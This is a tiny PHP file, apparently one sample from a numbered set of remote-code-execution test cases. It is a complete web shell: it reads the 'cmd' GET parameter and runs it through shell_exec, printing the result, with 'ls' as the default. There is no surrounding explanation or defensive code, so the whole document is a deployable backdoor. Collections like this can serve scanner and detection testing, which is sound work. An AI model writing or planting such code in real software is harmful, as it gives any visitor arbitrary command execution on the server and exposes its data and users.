<?php
// RCE test variation #75
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>